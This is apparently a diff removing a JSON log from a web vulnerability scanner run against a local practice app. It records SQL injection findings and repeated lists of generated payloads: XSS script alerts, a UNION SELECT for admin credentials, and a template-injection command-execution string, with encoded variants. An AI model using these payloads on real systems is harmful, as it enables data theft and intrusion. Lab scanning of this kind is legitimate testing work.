@@ -1,1718 +1,5 @@
 [
   {
-    "timestamp": 1781451658.5774696,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "a0caa50f-bd12-43aa-91de-b4f416c95bee",
-      "status": "VULN_FOUND",
-      "vulnerabilities": [
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/sqli_blind/?id=1admin%27+%23&Submit=Submit\nDB-error signature: True; differential signals=1 confidence=20% (status 200->200, len 5225->5262)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submit%27+OR+1%3D1--\nDB-error signature: True; differential signals=1 confidence=20% (status 200->200, len 5225->5264)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submitadmin%27+%23\nDB-error signature: True; differential signals=1 confidence=20% (status 200->200, len 5225->5262)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submit%27+UNION+SELECT+1%2C2%2C3--\nDB-error signature: True; differential signals=1 confidence=20% (status 200->200, len 5225->5274)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        }
-      ]
-    }
-  },
-  {
-    "timestamp": 1781451669.1298294,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "a28f6888-f6c3-427c-97bf-1f633293d274",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451679.5883455,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "fcb0a3bc-f742-4052-9463-0f1996e9c2a6",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451699.6102457,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "6d61fe29-5988-463d-9719-f4842e38fe06",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781451719.6357448,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "6d61fe29-5988-463d-9719-f4842e38fe06",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781451740.0664127,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "770382d1-f34a-4027-a45c-462f21ef7283",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451760.6277454,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "770382d1-f34a-4027-a45c-462f21ef7283",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451781.7485356,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "285478c6-1dac-427a-9433-68fb486a6564",
-      "status": "VULN_FOUND",
-      "vulnerabilities": [
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=adminadmin%27+%23&password=test&Login=Login\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5096)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin%27+UNION+SELECT+1%2C2%2C3--&password=test&Login=Login\nDB-error signature: True; differential signals=1 confidence=20% (status 200->200, len 862->840)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=test%27+OR+1%3D1--&Login=Login\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5098)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=testadmin%27+%23&Login=Login\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5096)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=test%27+UNION+SELECT+1%2C2%2C3--&Login=Login\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5108)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=test&Login=Login%27+OR+1%3D1--\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5098)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=test&Login=Loginadmin%27+%23\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5096)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=test&Login=Login%27+UNION+SELECT+1%2C2%2C3--\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5108)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        }
-      ]
-    }
-  },
-  {
-    "timestamp": 1781451792.4163573,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "285478c6-1dac-427a-9433-68fb486a6564",
-      "status": "VULN_FOUND",
-      "vulnerabilities": [
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=adminadmin%27+%23&password=test&Login=Login\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5096)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin%27+UNION+SELECT+1%2C2%2C3--&password=test&Login=Login\nDB-error signature: True; differential signals=1 confidence=20% (status 200->200, len 862->840)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=test%27+OR+1%3D1--&Login=Login\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5098)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=testadmin%27+%23&Login=Login\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5096)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=test%27+UNION+SELECT+1%2C2%2C3--&Login=Login\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5108)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=test&Login=Login%27+OR+1%3D1--\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5098)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=test&Login=Loginadmin%27+%23\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5096)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/brute/?username=admin&password=test&Login=Login%27+UNION+SELECT+1%2C2%2C3--\nDB-error signature: False; differential signals=3 confidence=70% (status 200->200, len 862->5108)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        }
-      ]
-    }
-  },
-  {
-    "timestamp": 1781451792.867123,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "98f209d6-c711-43db-800e-7aed42a6e82c",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451793.3546703,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "98f209d6-c711-43db-800e-7aed42a6e82c",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451793.5415766,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d1203268-6ee4-40e7-a57f-2f1993cd6d8c",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451793.6932297,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d1203268-6ee4-40e7-a57f-2f1993cd6d8c",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451794.0969605,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "dd4a1a90-d23f-4cb4-a4c5-d260e99b62d2",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451794.344296,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "dd4a1a90-d23f-4cb4-a4c5-d260e99b62d2",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451794.6373708,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "26dca13b-46c9-4065-9d4f-ede6b31a7255",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451794.818304,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "26dca13b-46c9-4065-9d4f-ede6b31a7255",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451798.3735847,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d148e73d-1275-45a0-b58c-9dd0e3640f85",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451801.8934433,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d148e73d-1275-45a0-b58c-9dd0e3640f85",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451802.2947154,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "3364fa3f-7111-4bbe-8df6-7c28ff39a10e",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451802.4081452,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "3364fa3f-7111-4bbe-8df6-7c28ff39a10e",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451802.5381303,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d13c69da-bde2-43b7-8f5f-6002b6de4b52",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451802.9513972,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d13c69da-bde2-43b7-8f5f-6002b6de4b52",
-      "status": "SUCCESS",
-      "vulnerabilities": []
-    }
-  },
-  {
-    "timestamp": 1781451812.9766471,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "98e6bba9-24ed-4cab-8033-5127d85d68b3",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451823.0136228,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "98e6bba9-24ed-4cab-8033-5127d85d68b3",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451833.0310056,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "1000f5d5-e7f2-4d7b-9a53-19319e142535",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submit",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451853.0699842,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "1000f5d5-e7f2-4d7b-9a53-19319e142535",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submit",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451873.105186,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "eb9c7c1f-fe0a-4bf6-b63e-740055c58ac7",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/xss_r/?name=test",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451893.128333,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "eb9c7c1f-fe0a-4bf6-b63e-740055c58ac7",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/xss_r/?name=test",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451913.1625934,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "8978987a-8378-4378-bf8f-ac8910e6df17",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/xss_d/?default=English",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
-          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
-          "UNION SELECT admin_creds, password FROM users--",
-          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
-          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
-          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
-          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
-          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
-          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
-        ]
-      }
-    }
-  },
-  {
-    "timestamp": 1781451933.2030034,
-    "scan_id": "ca55da99-cc45-475b-a086-4910bfb06050",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "8978987a-8378-4378-bf8f-ac8910e6df17",
-      "status": "SUCCESS",
-      "target_url": "http://localhost:8080/vulnerabilities/xss_d/?default=English",
-      "target_headers": {
-        "Cookie": "PHPSESSID=ms4c85pq6b5jgocvs69i57cl85; security=low"
-      },
-      "data": {
-        "generated_payloads": [
-          "<script>alert('XSS_BY_SIGMA')</script>",
-          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
-          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
